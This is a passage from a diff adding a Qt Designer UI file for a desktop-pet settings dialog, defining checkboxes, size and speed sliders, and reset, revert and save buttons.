+            </item>
+            <item row="0" column="1">
+             <widget class="QCheckBox" name="petChatterBox">
+              <property name="text">
+               <string>Let it talk</string>
+              </property>
+             </widget>
+            </item>
+            <item row="1" column="0">
+             <widget class="QCheckBox" name="petFollowBox">
+              <property name="text">
+               <string>Follow the cursor</string>
+              </property>
+             </widget>
+            </item>
+            <item row="1" column="1">
+             <widget class="QCheckBox" name="petOnTopBox">
+              <property name="text">
+               <string>Keep it above other windows</string>
+              </property>
+             </widget>
+            </item>
+           </layout>
+          </item>
+          <item>
+           <layout class="QHBoxLayout" name="petSliderRow">
+            <property name="spacing">
+             <number>10</number>
+            </property>
+            <item>
+             <widget class="QLabel" name="petScaleLabel">
+              <property name="text">
+               <string>Size</string>
+              </property>
+              <property name="role" stdset="0">
+               <string notr="true">fieldLabel</string>
+              </property>
+             </widget>
+            </item>
+            <item>
+             <widget class="QSlider" name="petScaleSlider">
+              <property name="minimumSize">
+               <size>
+                <width>90</width>
+                <height>0</height>
+               </size>
+              </property>
+              <property name="minimum">
+               <number>60</number>
+              </property>
+              <property name="maximum">
+               <number>200</number>
+              </property>
+              <property name="value">
+               <number>100</number>
+              </property>
+              <property name="orientation">
+               <enum>Qt::Orientation::Horizontal</enum>
+              </property>
+             </widget>
+            </item>
+            <item>
+             <widget class="QLabel" name="petScaleValue">
+              <property name="minimumSize">
+               <size>
+                <width>40</width>
+                <height>0</height>
+               </size>
+              </property>
+              <property name="text">
+               <string>100%</string>
+              </property>
+              <property name="alignment">
+               <set>Qt::AlignmentFlag::AlignRight|Qt::AlignmentFlag::AlignTrailing|Qt::AlignmentFlag::AlignVCenter</set>
+              </property>
+              <property name="role" stdset="0">
+               <string notr="true">faint</string>
+              </property>
+             </widget>
+            </item>
+            <item>
+             <spacer name="petSliderSpacer">
+              <property name="orientation">
+               <enum>Qt::Orientation::Horizontal</enum>
+              </property>
+              <property name="sizeType">
+               <enum>QSizePolicy::Policy::Fixed</enum>
+              </property>
+              <property name="sizeHint" stdset="0">
+               <size>
+                <width>12</width>
+                <height>10</height>
+               </size>
+              </property>
+             </spacer>
+            </item>
+            <item>
+             <widget class="QLabel" name="petSpeedLabel">
+              <property name="text">
+               <string>Speed</string>
+              </property>
+              <property name="role" stdset="0">
+               <string notr="true">fieldLabel</string>
+              </property>
+             </widget>
+            </item>
+            <item>
+             <widget class="QSlider" name="petSpeedSlider">
+              <property name="minimumSize">
+               <size>
+                <width>90</width>
+                <height>0</height>
+               </size>
+              </property>
+              <property name="minimum">
+               <number>20</number>
+              </property>
+              <property name="maximum">
+               <number>300</number>
+              </property>
+              <property name="value">
+               <number>100</number>
+              </property>
+              <property name="orientation">
+               <enum>Qt::Orientation::Horizontal</enum>
+              </property>
+             </widget>
+            </item>
+            <item>
+             <widget class="QLabel" name="petSpeedValue">
+              <property name="minimumSize">
+               <size>
+                <width>40</width>
+                <height>0</height>
+               </size>
+              </property>
+              <property name="text">
+               <string>1.0×</string>
+              </property>
+              <property name="alignment">
+               <set>Qt::AlignmentFlag::AlignRight|Qt::AlignmentFlag::AlignTrailing|Qt::AlignmentFlag::AlignVCenter</set>
+              </property>
+              <property name="role" stdset="0">
+               <string notr="true">faint</string>
+              </property>
+             </widget>
+            </item>
+           </layout>
+          </item>
+         </layout>
+</widget>
+        </item>
+
+       <item>
+        <spacer name="bottomSpacer">
+         <property name="orientation">
+          <enum>Qt::Orientation::Vertical</enum>
+         </property>
+         <property name="sizeHint" stdset="0">
+          <size>
+           <width>10</width>
+           <height>10</height>
+          </size>
+         </property>
+        </spacer>
+       </item>
+      </layout>
+</widget>
+     </widget>
+    </item>
+   <item>
+    <layout class="QHBoxLayout" name="saveRow">
+     <property name="spacing">
+      <number>8</number>
+     </property>
+     <item>
+      <widget class="QLabel" name="saveNote">
+       <property name="text">
+        <string/>
+       </property>
+      </widget>
+     </item>
+     <item>
+      <spacer name="saveSpacer">
+       <property name="orientation">
+        <enum>Qt::Orientation::Horizontal</enum>
+       </property>
+       <property name="sizeHint" stdset="0">
+        <size>
+         <width>40</width>
+         <height>10</height>
+        </size>
+       </property>
+      </spacer>
+</item>
+      <item>
+       <widget class="QPushButton" name="resetButton">
+        <property name="text">
+         <string>Reset all settings</string>
+        </property>
+        <property name="ghost" stdset="0">
+         <bool>true</bool>
+        </property>
+       </widget>
+      </item>
+      <item>
+       <widget class="QPushButton" name="revertButton">
+       <property name="text">
+        <string>Revert</string>
+       </property>
+       <property name="ghost" stdset="0">
+        <bool>true</bool>
+       </property>
+      </widget>
+     </item>
+     <item>
+      <widget class="QPushButton" name="saveButton">
+       <property name="text">
+        <string>Save</string>
+       </property>
+       <property name="primary" stdset="0">
+        <bool>true</bool>
+       </property>
+      </widget>
+     </item>
+    </layout>
+   </item>
+  </layout>
+  </widget>
+  <customwidgets>
+  <customwidget>
+   <class>ValidatedField</class>
+   <extends>QWidget</extends>
+   <header>widgets/fieldrow.h</header>
+  </customwidget>
+  <customwidget>
+   <class>ToggleSwitch</class>
+   <extends>QWidget</extends>
+   <header>widgets/toggleswitch.h</header>
+  </customwidget>
+ </customwidgets>
+ <resources/>
+ <connections/>
+</ui>
